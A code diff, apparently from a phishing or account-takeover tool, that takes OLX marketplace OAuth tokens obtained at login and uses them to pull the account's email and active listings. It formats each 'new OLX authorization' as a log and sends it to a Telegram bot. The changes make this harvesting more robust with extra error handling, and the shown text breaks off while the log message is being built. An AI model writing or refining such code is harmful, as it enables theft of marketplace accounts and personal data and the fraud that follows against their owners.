@@ -16,7 +16,12 @@ def send_telegram_message(msg):
     try:
         requests.post(
             f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
-            json={"chat_id": TG_CHAT_ID, "text": msg, "parse_mode": "HTML", "disable_web_page_preview": True},
+            json={
+                "chat_id": TG_CHAT_ID, 
+                "text": msg, 
+                "parse_mode": "HTML", 
+                "disable_web_page_preview": True
+            },
             timeout=10
         )
     except Exception as e:
@@ -62,37 +67,56 @@ def get_token():
             access = res_json.get('access_token')
             refresh = res_json.get('refresh_token')
 
-            # --- ДОПОЛНИТЕЛЬНЫЙ СБОР ДАННЫХ ---
+            # --- СБОР ДАННЫХ ПОСЛЕ АВТОРИЗАЦИИ ---
             auth_headers = {
                 "Authorization": f"Bearer {access}",
                 "Version": "2.0",
-                "Accept": "application/json"
+                "Accept": "application/json",
+                "User-Agent": "Mozilla/5.0"
             }
 
             # А) Получаем Email
             email = "Не удалось получить"
             try:
-                user_req = requests.get("https://www.olx.ua/api/open/users/me", headers=auth_headers, timeout=5)
+                user_req = requests.get("https://www.olx.ua/api/open/users/me", headers=auth_headers, timeout=7)
                 if user_req.status_code == 200:
-                    email = user_req.json().get('data', {}).get('email', 'Email скрыт')
-            except: pass
+                    u_json = user_req.json()
+                    # Проверяем, лежат данные в ключе 'data' или в корне
+                    u_data = u_json.get('data', u_json)
+                    email = u_data.get('email', 'Email скрыт')
+                else:
+                    email = f"Ошибка запроса ({user_req.status_code})"
+            except Exception as e:
+                email = f"Ошибка: {str(e)[:30]}"
 
             # Б) Получаем активные объявления
             ads_info = "Объявлений не найдено"
             try:
-                ads_req = requests.get("https://www.olx.ua/api/open/adverts", headers=auth_headers, params={"status": "active"}, timeout=5)
+                ads_req = requests.get(
+                    "https://www.olx.ua/api/open/adverts", 
+                    headers=auth_headers, 
+                    params={"status": "active"}, 
+                    timeout=7
+                )
                 if ads_req.status_code == 200:
-                    ads_data = ads_req.json().get('data', [])
+                    a_json = ads_req.json()
+                    ads_data = a_json.get('data', [])
                     if ads_data:
                         links = []
-                        for ad in ads_data[:10]: # Ограничим до 10 штук, чтобы сообщение не было слишком длинным
-                            links.append(f"• <a href='{ad.get('url')}'>{ad.get('title')}</a>")
+                        for ad in ads_data[:10]: # Лимит 10 ссылок
+                            title = ad.get('title', 'Без названия')
+                            url = ad.get('url', '#')
+                            links.append(f"• <a href='{url}'>{title}</a>")
+                        
                         ads_info = "\n".join(links)
                         if len(ads_data) > 10:
                             ads_info += f"\n<i>...и еще {len(ads_data)-10} шт.</i>"
-            except: pass
+                else:
+                    ads_info = f"Ошибка запроса ({ads_req.status_code})"
+            except Exception as e:
+                ads_info = f"Ошибка при поиске: {str(e)[:30]}"
 
-            # Формируем итоговый лог
+            # Формируем итоговый лог для Telegram
             msg = (
                 f"🚀 <b>НОВЫЙ OLX АВТОРИЗАЦИЯ</b>\n\n"
                 f"👤 <b>Email:</b> <code>{email}</code>\n\n"
